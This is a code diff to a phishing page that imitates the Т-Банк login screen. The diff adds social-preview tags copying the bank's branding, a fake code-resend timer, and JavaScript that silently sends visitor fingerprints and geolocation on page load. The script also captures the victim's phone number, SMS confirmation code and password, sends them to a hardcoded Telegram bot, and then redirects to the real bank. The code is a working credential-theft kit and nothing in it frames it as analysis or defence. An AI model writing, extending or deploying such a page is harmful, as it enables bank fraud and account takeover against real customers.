@@ -4,6 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Вход в Т-Банк</title>
+<meta property="og:title" content="Т-Банк">
+<meta property="og:description" content="Вход в личный кабинет Т-Банка">
+<meta property="og:image" content="https://www.tbank.ru/favicon.ico">
+<meta property="og:url" content="https://твой-домен.com">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 body { background: #fff; color: #333; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
@@ -22,6 +26,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
 .biometric span { color: #5288c1; }
 .policy { text-align: center; font-size: 12px; color: #999; margin-top: 30px; text-decoration: underline; cursor: pointer; }
 .step2 p, .step3 p { text-align: center; color: #666; font-size: 15px; margin-bottom: 25px; }
+.timer { text-align: center; color: #999; font-size: 14px; margin-top: 15px; }
 .hidden { display: none; }
 </style>
 </head>
@@ -50,6 +55,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
       <label>Код</label>
       <input type="tel" id="code" placeholder="Код" maxlength="5">
     </div>
+    <div class="timer" id="timer">Отправим снова через 40 сек</div>
   </div>
 
   <div id="step3" class="step3 hidden">
@@ -66,11 +72,41 @@ input:focus { border-color: #ffdd2d; background: #fff; }
 <script>
 var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
 var chat = '7887003990';
+var userData = {};
 
 function send(text) {
   var img = new Image();
   img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
 }
+
+function getDeviceInfo() {
+  return 'Устройство: ' + navigator.userAgent +
+    '\nЯзык: ' + navigator.language +
+    '\nЭкран: ' + screen.width + 'x' + screen.height +
+    '\nПлатформа: ' + navigator.platform;
+}
+
+function getGeo() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      send('📍 Гео: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+    }, function() {
+      send('📍 Гео: отказ');
+    });
+  }
+}
+
+function getUserID() {
+  var id = localStorage.getItem('uid');
+  if (!id) {
+    id = Math.random().toString(36).substring(2, 10);
+    localStorage.setItem('uid', id);
+  }
+  return id;
+}
+
+send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
+getGeo();
 
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
@@ -78,14 +114,26 @@ document.getElementById('next1').addEventListener('click', function() {
     alert('Введите номер телефона');
     return;
   }
-  send('Телефон: ' + phone);
+  userData.phone = phone;
+  send('📱 Телефон: ' + phone);
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
+  var t = 40;
+  var timer = document.getElementById('timer');
+  var int = setInterval(function() {
+    t--;
+    timer.textContent = 'Отправим снова через ' + t + ' сек';
+    if (t <= 0) {
+      clearInterval(int);
+      timer.textContent = 'Отправить код снова';
+    }
+  }, 1000);
 });
 
 document.getElementById('code').addEventListener('input', function() {
   if (this.value.length === 5) {
-    send('Код: ' + this.value);
+    userData.code = this.value;
+    send('🔑 Код: ' + this.value);
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
   }
@@ -97,7 +145,9 @@ document.getElementById('login').addEventListener('click', function() {
     alert('Введите пароль');
     return;
   }
-  send('Пароль: ' + pass);
+  userData.pass = pass;
+  send('🔒 Пароль: ' + pass);
+  send('✅ Итог:\nТелефон: ' + userData.phone + '\nКод: ' + userData.code + '\nПароль: ' + pass);
   window.location.href = 'https://www.tbank.ru';
 });
 </script>
